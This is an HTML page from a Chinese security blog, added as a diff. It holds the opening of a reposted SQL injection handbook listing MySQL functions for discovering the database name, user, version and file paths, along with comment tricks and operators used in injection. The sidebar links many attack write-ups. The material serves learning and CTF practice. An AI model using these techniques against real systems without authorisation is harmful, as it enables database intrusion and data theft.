@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          SQL注入手册 - ca01h&#39;s Blog
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+	
+<link rel="stylesheet" href="/css/fontawesome/all.css">
+
+	
+<script src="/js/fontawesome/all.js"></script>
+
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="ca01h's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+<body>
+
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>CA01H&#39;S BLOG</span>
+  </a>
+</div>
+    <div class="book-menu">
+  <h1 id="文章归档"><a href="/archives/index.html"><strong>文章归档</strong></a></h1>
+<h1 id="置顶文章"><strong>置顶文章</strong></h1>
+<ul>
+<li><a href="/Other/6.Linux-Enumeration">Linux Enumeration</a></li>
+</ul>
+<h1 id="Web安全"><strong>Web安全</strong></h1>
+<h2 id="Web安全基础">Web安全基础</h2>
+<ul>
+<li><a href="/Web_security/basic_learning/1.%E5%9C%A8Ubuntu18.04%E5%AE%89%E8%A3%85LNMP">在Ubuntu18.04安装LNMP</a></li>
+<li><a href="/Web_security/basic_learning/2.MySQL%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C">MySQL数据库基本操作</a></li>
+<li><a href="/Web_security/basic_learning/3.MySQL%E7%9A%84%E7%B3%BB%E7%BB%9F%E8%A1%A8%E3%80%81%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%92%8CHash%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">MySQL的系统表、文件读写</a></li>
+<li><a href="/Web_security/basic_learning/4.%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8A%9F%E8%83%BD%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0">数据库系统功能相关学习</a></li>
+<li><a href="/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0">数据库注入语句的收集和学习</a></li>
+<li><a href="/Web_security/basic_learning/6.Web%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0">Web页面解析的流程学习</a></li>
+<li><a href="/Web_security/basic_learning/7.%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%E7%9A%84%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%92%8C%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99">各种注入类型的环境搭建和代码编写</a></li>
+<li><a href="/Web_security/basic_learning/9.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Basic-Challenge">Sqli-labs手工注入(一)</a></li>
+<li><a href="/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections">Sqli-labs手工注入(二)</a></li>
+<li><a href="/Web_security/basic_learning/10.SQLMap%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0">SQLMap入门学习</a></li>
+<li><a href="/Web_security/basic_learning/11.SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5">SQL注入——双查询注入</a></li>
+<li><a href="/Web_security/basic_learning/12.XSS%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0">XSS漏洞实战学习</a></li>
+<li><a href="/Web_security/basic_learning/13.%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件包含漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/14.%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">变量覆盖漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/16.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">文件上传漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">SSRF漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/18.%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">命令执行漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/19.%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">逻辑漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">XXE漏洞利用</a></li>
+<li><a href="/Web_security/basic_learning/21.NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">NoSQL注入之MongoDB</a></li>
+<li><a href="/Web_security/basic_learning/22.SQL%E6%B3%A8%E5%85%A5%E4%B8%93%E9%A1%B9%E4%B9%8BMySQL%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95">SQL注入专项之MySQL基本注入语法</a></li>
+<li><a href="/Web_security/basic_learning/24.%E6%B5%85%E8%B0%88LDAP%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">浅谈LDAP注入攻击</a></li>
+<li><a href="/Web_security/basic_learning/26.MySQL%E6%94%BB%E5%87%BB%E9%9D%A2%E5%92%8C%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93">MySQL攻击面和提权总结</a></li>
+<li><a href="/Web_security/basic_learning/27.SQL%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C">SQL注入手册</a></li>
+</ul>
+<h2 id="PHP相关">PHP相关</h2>
+<ul>
+<li><a href="/Web_security/php_related/1.PHP%E5%9B%9E%E8%B0%83%E5%90%8E%E9%97%A8">PHP回调后门</a></li>
+<li><a href="/Web_security/php_related/2.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%9F%BA%E7%A1%80%E7%AF%87">PHP反序列化——基础篇</a></li>
+<li><a href="/Web_security/php_related/3.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Phar</a></li>
+<li><a href="/Web_security/php_related/4.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">PHP反序列化——Session</a></li>
+<li><a href="/Web_security/php_related/5.PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8">PHP反序列化-原生类利用</a></li>
+<li><a href="/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell">PHP无数字字母构造webshell</a></li>
+<li><a href="/Web_security/php_related/9.%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6%E4%B9%A0PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8">PHP无参数函数的利用</a></li>
+<li><a href="/Web_security/php_related/10.%E5%88%A9%E7%94%A8SoapClient%E7%B1%BB%E8%BF%9B%E8%A1%8CSSRF-CRLF%E6%94%BB%E5%87%BB">SoapClient+SSRF+CRLF利用</a></li>
+<li><a href="/Web_security/php_related/11.PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90">PHP复杂变量解析</a></li>
+<li><a href="/Web_security/php_related/12.PHP%E7%9A%84LFI%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93">PHP LFI to RCE</a></li>
+<li><a href="/Web_security/php_related/13.session.upload_progress+LFI%E5%AE%9E%E7%8E%B0RCE">session.upload-progress+LFI实现RCE</a></li>
+</ul>
+<h2 id="Writeups">Writeups</h2>
+<ul>
+<li><a href="/Web_security/ctf_writeup/3.CGCTF-Writeup">CGCTF-Writeup</a></li>
+<li><a href="/Web_security/ctf_writeup/4.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1">BUUCTF—PHP代审</a></li>
+<li><a href="/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87">BUUCTF—PHP框架漏洞</a></li>
+<li><a href="/Web_security/ctf_writeup/6.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">BUUCTF—PHP反序列化</a></li>
+<li><a href="/Web_security/ctf_writeup/7.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SQL%E6%B3%A8%E5%85%A5">BUUCTF—SQL注入</a></li>
+<li><a href="/Web_security/ctf_writeup/8.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94XSS">BUUCTF—XSS</a></li>
+<li><a href="/Web_security/ctf_writeup/9.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94SSRF">BUUCTF—SSRF</a></li>
+<li><a href="/Web_security/ctf_writeup/10.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">BUUCTF—命令执行</a></li>
+<li><a href="/Web_security/ctf_writeup/11.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">BUUCTF—文件上传</a></li>
+<li><a href="/Web_security/ctf_writeup/12.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">BUUCTF—文件包含</a></li>
+<li><a href="/Web_security/ctf_writeup/13.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Python">BUUCTF—Python</a></li>
+<li><a href="/Web_security/ctf_writeup/14.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94NodeJS">BUUCTF—NodeJS</a></li>
+<li><a href="/Web_security/ctf_writeup/15.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94Ruby%E5%8F%8AGo">BUUCTF—Ruby和Go</a></li>
+<li><a href="/Web_security/ctf_writeup/16.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%AF%87">BUUCTF—渗透测试</a></li>
+<li><a href="/Web_security/ctf_writeup/25.CTFShow-Web%E5%85%A5%E9%97%A8">CTFShow—Web入门</a></li>
+<li><a href="/Web_security/ctf_writeup/17.2020%E7%94%B5%E4%BF%A1%E5%A4%A9%E7%BF%BC%E6%9D%AFCTF%E2%80%94APITest">2020电信天翼杯CTF—APITest</a></li>
+<li><a href="/Web_security/ctf_writeup/18.%E6%98%9F%E7%9B%9F6%E6%9C%88AWD%E5%A4%8D%E7%9B%98%E2%80%94%E2%80%94web+pwn">星盟6月AWD Web+Pwn</a></li>
+<li><a href="/Web_security/ctf_writeup/19.DASCTF2020%E4%B8%83%E6%9C%88%E8%B5%9B">DASCTF2020七月赛 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/20.CSICTF2020">CSICTF2020 Web+Linux</a></li>
+<li><a href="/Web_security/ctf_writeup/21.2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9BCTF-Web">2020第五空间CTF Web</a></li>
+<li><a href="/Web_security/ctf_writeup/22.%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AFCTF">首届钓鱼城杯CTF</a></li>
+<li><a href="/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B">DASCTF八月赛</a></li>
+<li><a href="/Web_security/ctf_writeup/24.CTFShow-1024%E6%9D%AF-Web-Writeup">CTFShow 1024杯 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/26.ByteCTF2020-scrapy-redis%E5%A4%8D%E7%8E%B0">ByteCTF2020 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/27.UNCTF2020-Web-Writeup">UNCTF2020 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/28.%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Web-Writeups">羊城杯2020 Web</a></li>
+<li><a href="/Web_security/ctf_writeup/29.NCTF2019-PharMatchesEverything">NCTF2019 Phar matches everything</a></li>
+</ul>
+<h1 id="靶机系列"><strong>靶机系列</strong></h1>
+<h2 id="HackTheBox">HackTheBox</h2>
+<ul>
+<li><a href="/Target_drone/HackTheBox/1.HTB-OpenAdmin-walkthrough">HTB::OpenAdmin</a></li>
+<li><a href="/Target_drone/HackTheBox/2.HTB-Postman-walkthrough">HTB::Postman</a></li>
+<li><a href="/Target_drone/HackTheBox/3.HTB-Traverxec-walkthrough">HTB::Traverxec</a></li>
+<li><a href="/Target_drone/HackTheBox/4.HTB-Obscurity-walkthrough">HTB::Obscurity</a></li>
+<li><a href="/Target_drone/HackTheBox/5.HTB-Mongo-walkthrough">HTB::Mongo</a></li>
+<li><a href="/Target_drone/HackTheBox/6.HTB-Tenten-walkthrough">HTB::Tenten</a></li>
+<li><a href="/Target_drone/HackTheBox/7.HTB-Sneaky-walkthrough">HTB::Sneaky</a></li>
+<li><a href="/Target_drone/HackTheBox/8.HTB-Teacher-walkthrough">HTB::Teacher</a></li>
+<li><a href="/Target_drone/HackTheBox/9.HTB-Irked-walkthrough">HTB::Irked</a></li>
+<li><a href="/Target_drone/HackTheBox/10.HTB-Traceback-walkthrough">HTB::Traceback</a></li>
+<li><a href="/Target_drone/HackTheBox/11.HTB-DevOops-walkthrough">HTB::DevOops</a></li>
+<li><a href="/Target_drone/HackTheBox/12.HTB-Blocky-walkthrough">HTB::Blocky</a></li>
+<li><a href="/Target_drone/HackTheBox/13.HTB-Beep-walkthrough">HTB::Beep</a></li>
+<li><a href="/Target_drone/HackTheBox/14.HTB-Book-walkthrough">HTB::Book</a></li>
+<li><a href="/Target_drone/HackTheBox/15.HTB-Magic-walkthrough">HTB::Magic</a></li>
+<li><a href="/Target_drone/HackTheBox/16.HTB-Craft-walkthrough">HTB::Craft</a></li>
+<li><a href="/Target_drone/HackTheBox/17.HTB-CTF-walkthrough">HTB::CTF</a></li>
+<li><a href="/Target_drone/HackTheBox/18.HTB-Admirer-walkthrough">HTB::Admirer</a></li>
+</ul>
+<h2 id="VulnHub">VulnHub</h2>
+<ul>
+<li><a href="/Target_drone/VulnHub/1.VulnHub-BossplayersCTF-walkthrough">VulnHub::BossplayersCTF</a></li>
+<li><a href="/Target_drone/VulnHub/2.VulnHub-DC-1-walkthrough">VulnHub::DC-1</a></li>
+<li><a href="/Target_drone/VulnHub/3.VulnHub-DigitalWorld-Local-JOY-walkthrough">VulnHub::DigitalWorld:JOY</a></li>
+</ul>
+<h1 id="代码审计"><strong>代码审计</strong></h1>
+<h2 id="PHP代码审计">PHP代码审计</h2>
+<ul>
+<li><a href="/code_audit/3.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day1">PHP代码审计学习—Day1</a></li>
+<li><a href="/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2">PHP代码审计学习—Day2</a></li>
+<li><a href="/code_audit/5.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day3">PHP代码审计学习—Day3</a></li>
+<li><a href="/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4">PHP代码审计学习—Day4</a></li>
+<li><a href="/code_audit/7.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day5">PHP代码审计学习—Day5</a></li>
+<li><a href="/code_audit/1.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94yixuncms">PHP代码审计复现—yixuncms</a></li>
+<li><a href="/code_audit/2.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0%E2%80%94%E2%80%94chinaz">PHP代码审计复现—chinaz</a></li>
+<li><a href="/code_audit/8.Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E6%8B%93%E5%B1%95">CVE-2020-15148 Yii2反序列化</a></li>
+</ul>
+<h1 id="流量分析"><strong>流量分析</strong></h1>
+<ul>
+<li><a href="/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1">Datacon2019-q1-wp-v1</a></li>
+<li><a href="/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2">Datacon2019-q1-wp-v2</a></li>
+<li><a href="/Web_security/traffic_analysis/3.Bro%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">Bro语法学习之基础知识</a></li>
+</ul>
+<h1 id="机器学习"><strong>机器学习</strong></h1>
+<h2 id="基础学习">基础学习</h2>
+<ul>
+<li><a href="/Machine_learning/basic_learning/1.Machine-Learning-Week1">Machine-Learning-Week1</a></li>
+<li><a href="/Machine_learning/basic_learning/2.Machine-Learning-Week2">Machine-Learning-Week2</a></li>
+<li><a href="/Machine_learning/basic_learning/3.Machine-Learning-Week3">Machine-Learning-Week3</a></li>
+<li><a href="/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89">机器学习与网络安全相关的资料（转）</a></li>
+</ul>
+<h1 id="Python"><strong>Python</strong></h1>
+<h2 id="Python编程">Python编程</h2>
+<ul>
+<li>
+<p><a href="/Python/code/1.Python%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0">Python函数的参数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/2.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%AB%98%E9%98%B6%E5%87%BD%E6%95%B0">Python函数式编程之高阶函数</a></p>
+</li>
+<li>
+<p><a href="/Python/code/3.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E9%97%AD%E5%8C%85">Python函数式编程-闭包</a></p>
+</li>
+<li>
+<p><a href="/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8">Python函数式编程-装饰器</a></p>
+</li>
+<li>
+<p><a href="/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF">Python面向对象高级编程之slots、@property和多重继承</a></p>
+</li>
+<li>
+<p><a href="/Python/code/6.PythonIO%E7%BC%96%E7%A8%8B">PythonIO编程</a></p>
+</li>
+</ul>
+<h1 id="Java"><strong>Java</strong></h1>
+<h2 id="Java编程">Java编程</h2>
+<ul>
+<li><a href="/Java/code/1.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8BJDK%E3%80%81JRE%E3%80%81JVM">Java基础学习之JDK、JRE、JVM</a></li>
+<li><a href="/Java/code/2.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%B8%E5%BF%83%E7%B1%BB">Java基础学习之核心类</a></li>
+<li><a href="/Java/code/3.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E5%9F%BA%E7%A1%80">Java基础学习之面向对象基础</a></li>
+<li><a href="/Java/code/4.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86">Java基础学习之异常处理</a></li>
+</ul>
+<h1 id="算法"><strong>算法</strong></h1>
+<h2 id="Leetcode">Leetcode</h2>
+<ul>
+<li><a href="/Algorithm/1.Leetcode-Primary-class">Leetcode-Primary-class</a></li>
+</ul>
+<h1 id="随笔"><strong>随笔</strong></h1>
+<h2 id="经验">经验</h2>
+<ul>
+<li><a href="/Essay/%E4%BB%8E0%E5%88%B0100%E5%88%86%E7%9A%84%E8%B7%AF%E7%A8%8B%E2%80%94%E2%80%94%E5%86%99%E5%9C%A82019%E5%B9%B4%E7%9A%84%E6%9C%80%E5%90%8E%E4%B8%80%E5%A4%A9">从0到100分的路程——写在2019年的最后一天</a></li>
+</ul>
+<h2 id="技术">技术</h2>
+<ul>
+<li><a href="/Other/1.%E9%98%BF%E9%87%8C%E4%BA%91Centos7-Ngnix%E9%83%A8%E7%BD%B2Hexo">阿里云Centos7-Ngnix部署Hexo</a></li>
+<li><a href="/Other/2.%E9%98%BF%E9%87%8C%E4%BA%91OSS-PicGo%E6%90%AD%E5%BB%BAMarkdown%E5%9B%BE%E5%BA%8A">阿里云OSS-PicGo搭建Markdown图床</a></li>
+<li><a href="/Other/3.Hexo%E6%B8%B2%E6%9F%93LaTeX%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F">Hexo渲染LaTeX数学公式</a></li>
+<li><a href="/Other/4.git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE">Git CheatSheet</a></li>
+<li><a href="/Other/5.Tmux%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%87%E5%BF%98%E5%BD%95">Tmux CheatSheet</a></li>
+</ul>
+
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  
+  <i class="fas fa-calendar-day"></i>&nbsp;2020-12-10&nbsp;
+  <i class="fas fa-file-word"></i>&nbsp;<span class="post-count">3.5k</span>
+  
+  <h1 id="SQL注入手册【转】">SQL注入手册【转】</h1>
+<blockquote>
+<p>来自https://northity.com/2019/03/02/Sql%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C</p>
+</blockquote>
+<h2 id="常见数据库搭配">常见数据库搭配</h2>
+<ul>
+<li>ASP + ACCESS + IIS</li>
+<li><a target="_blank" rel="noopener" href="http://ASP.NET">ASP.NET</a> + MSSQL +IIS</li>
+<li>PHP + Mysql + Apache(Nginx)</li>
+<li>JSP + Oracle(Mysql) + Tomcat</li>
+</ul>
+<p>目前来讲就遇到过这些常见组合，快速判断数据库类型是注入的第一步</p>
+<h2 id="Mysql">Mysql</h2>
+<h3 id="基础">基础</h3>
+<h4 id="数据库名">数据库名</h4>
+<ul>
+<li>
+<p>database()</p>
+</li>
+<li>
+<p>schema()</p>
+</li>
+</ul>
+<h4 id="当前登陆用户">当前登陆用户</h4>
+<ul>
+<li>
+<p>USER()</p>
+</li>
+<li>
+<p>CURRENT_USER()</p>
+</li>
+<li>
+<p>SYSTEM_USER()</p>
+</li>
+<li>
+<p>SESSION_USER()</p>
+</li>
+</ul>
+<h4 id="数据库版本">数据库版本</h4>
+<ul>
+<li>
+<p>VERSION()</p>
+</li>
+<li>
+<p>@@VERSION</p>
+</li>
+<li>
+<p>@@GLOBAL.VERSION</p>
+</li>
+</ul>
+<h4 id="路径相关">路径相关</h4>
+<ul>
+<li>
+<p>@@BASEDIR : mysql安装路径</p>
+</li>
+<li>
+<p>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</p>
+</li>
+<li>
+<p>@@DATADIR : 数据存储路径</p>
+</li>
+<li>
+<p>@@CHARACTER_SETS_DIR : 字符集设置文件路径</p>
+</li>
+<li>
+<p>@@LOG_ERROR : 错误日志文件路径</p>
+</li>
+<li>
+<p>@@PID_FILE : pid-file文件路径</p>
+</li>
+<li>
+<p>@@BASEDIR : mysql安装路径</p>
+</li>
+<li>
+<p>@@SLAVE_LOAD_TMPDIR : 临时文件夹路径</p>
+</li>
+</ul>
+<h4 id="字符串连接">字符串连接</h4>
+<ul>
+<li>concat(str1,str2) //将字符串首尾相连</li>
+<li>concat_ws(separator,str1,str2) //将字符串用指定连接符连接</li>
+<li>group_concat()//</li>
+</ul>
+<h4 id="字符截断">字符截断</h4>
+<ul>
+<li>left(str,index) //从左边第index开始截取</li>
+<li>right(str,index) //从右边第index开始截取</li>
+<li>substring(str,index) //从左边index开始截取</li>
+<li>substr(str,index,len) //截取str,index开始,截取len的长度</li>
+<li>mid(str,index,ken) //截取str 从index开始,截取len的长度</li>
+</ul>
+<h4 id="字符串比较函数">字符串比较函数</h4>
+<ul>
+<li>strcmp(expr1,expr2)//如果两个字符串是一样则返回0,如果第一个小于第二个则返回-1</li>
+<li>find_in_set(str,strlist) //如果相同则返回1不同则返回0</li>
+</ul>
+<h4 id="注释">注释</h4>
+<ul>
+<li>
+<p>–(后面还有个空格)</p>
+</li>
+<li>
+<p># 单行注释符，url编码为%23</p>
+</li>
+<li>
+<p>/*…*/</p>
+</li>
+<li>
+<p>/! 语句 / 语句会被执行 可用做分割</p>
+</li>
+</ul>
+<h4 id="运算符">运算符</h4>
+<p>比较运算符</p>
+<ul>
+<li>
+<p>=</p>
+</li>
+<li>
+<p>&gt;</p>
+</li>
+<li>
+<p>&lt;</p>
+</li>
+<li>
+<p>!=</p>
+</li>
+<li>
+<p>&lt;&gt; 不等于的意思</p>
+</li>
+<li>
+<p>like (模糊匹配 <code>select '12345' like '12%' =&gt; true</code>)</p>
+</li>
+<li>
